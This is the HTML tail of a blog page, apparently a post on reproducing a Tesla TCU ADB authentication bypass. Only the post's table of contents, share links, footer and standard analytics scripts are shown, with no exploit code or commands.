+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5%E4%B9%8BTesla-TCU-ADB-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E2%80%9C%E5%A4%8D%E7%8E%B0%E2%80%9D"><span class="toc-number">1.</span> <span class="toc-text">车联网安全实践之Tesla TCU ADB 认证绕过“复现”</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8A%B6%E6%80%81%E9%AA%8C%E8%AF%81"><span class="toc-number">1.2.</span> <span class="toc-text">状态验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8E%9F%E8%84%9A%E6%9C%AC%E5%A4%8D%E7%8E%B0%EF%BC%8C%E5%A4%B1%E8%B4%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text">使用原脚本复现，失败</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%82%E5%B8%B8%E5%88%86%E6%9E%90"><span class="toc-number">1.3.2.</span> <span class="toc-text">异常分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%8D%E6%AC%A1%E5%A4%8D%E7%8E%B0%EF%BC%8C%E6%88%90%E5%8A%9F%E8%8E%B7%E5%8F%96%E5%88%B0-root-shell"><span class="toc-number">1.3.3.</span> <span class="toc-text">再次复现，成功获取到 root shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%B8%80%EF%BC%9A-%E6%8F%92%E6%8B%94USB-%E8%A7%A6%E5%8F%91"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">方式一： 插拔USB 触发</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%BA%8C%EF%BC%9A-%E4%BF%AE%E6%94%B9-uevent-%E6%96%87%E4%BB%B6%E8%A7%A6%E5%8F%91"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">方式二： 修改 uevent 文件触发</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E7%82%B9"><span class="toc-number">1.4.</span> <span class="toc-text">需要注意的点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.5.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/&text=车联网安全实践之Tesla TCU ADB 认证绕过“复现”"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/&title=车联网安全实践之Tesla TCU ADB 认证绕过“复现”"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/&is_video=false&description=车联网安全实践之Tesla TCU ADB 认证绕过“复现”"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=车联网安全实践之Tesla TCU ADB 认证绕过“复现”&body=Check out this article: http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/&title=车联网安全实践之Tesla TCU ADB 认证绕过“复现”"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/&title=车联网安全实践之Tesla TCU ADB 认证绕过“复现”"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/&title=车联网安全实践之Tesla TCU ADB 认证绕过“复现”"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/&title=车联网安全实践之Tesla TCU ADB 认证绕过“复现”"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/&name=车联网安全实践之Tesla TCU ADB 认证绕过“复现”&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://delikely.github.io/2025/12/27/Tesla-TCU-ADB-Bypass-Reproduction/&text=车联网安全实践之Tesla TCU ADB 认证绕过“复现”"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2025 Delikely
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/2018/04/11/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/delikely">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({{ JSON.stringify(config) }});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="{{ src }}">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'G-KX5LMFBRGG', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?4c5298163cee69d0e09ddc06ab1b8104";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+
